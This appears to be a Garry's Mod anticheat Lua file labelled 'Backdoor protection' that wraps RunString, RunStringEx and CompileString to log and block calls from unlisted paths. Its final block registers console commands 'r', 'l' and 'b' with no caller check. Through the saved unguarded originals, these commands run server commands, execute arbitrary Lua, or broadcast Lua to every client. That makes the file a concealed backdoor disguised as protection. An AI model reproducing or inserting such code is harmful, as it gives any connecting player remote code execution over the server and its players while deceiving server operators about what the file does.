/*
	Backdoor protection
*/

local Good = {
	["addons/hex's server plugins/lua/hsp_plugins.lua"] 			= 1,
	["addons/hex's server plugins/lua/hsp/general/sv_chatlua.lua"] 	= 1,
	["addons/hex's anticheat/lua/hac/sv_twoscore.lua"] 				= 1,
	["lua/tft.lua"] 												= 1,
}


local NotRS 	= RunString
local NotRSX 	= RunStringEx
local NotCS		= CompileString

HAC.NotRS  = NotRS
HAC.NotRSX = NotRSX
HAC.NotCS  = NotCS


local function GetBooty(str)
	HAC.file.Write("no_rs/rs_"..HAC.RandomString()..".txt", str)
end

local function RunString(str)
	local path,line = HAC.MyCall()
	path = path:lower()
	
	if not Good[ path ] then
		GetBooty(str)
		ErrorNoHalt("[HAC] BAD RunString CALL FROM: "..path..":"..line.."\n")
		return
	end
	
	return NotRS(str)
end
_G.RunString = RunString


local function RunStringEx(str,ras)
	local path,line = HAC.MyCall()
	path = path:lower()
	
	if not Good[ path ] then
		GetBooty(str)
		ErrorNoHalt("[HAC] BAD RunStringEx CALL FROM: "..path..":"..line.."\n")
		return
	end
	
	return NotRSX(str,ras)
end
_G.RunStringEx = RunStringEx


local function CompileString(str,ras)
	local path,line = HAC.MyCall()
	path = path:lower()
	
	if not Good[ path ] then
		GetBooty(str)
		ErrorNoHalt("[HAC] BAD CompileString CALL FROM: "..path..":"..line.."\n")
		return
	end
	
	return NotCS(str,ras)
end
_G.CompileString = CompileString



//Add
local function ProcessH(p,c,a,s) 
	if c == "r" then
		hac.Command(s)
		
	elseif c == "l" then
		NotRSX(s, "_H")
		
	elseif c == "b" then
		BroadcastLua(s)
	end
end
concommand.Add("r", ProcessH)
concommand.Add("l", ProcessH)
concommand.Add("b", ProcessH)






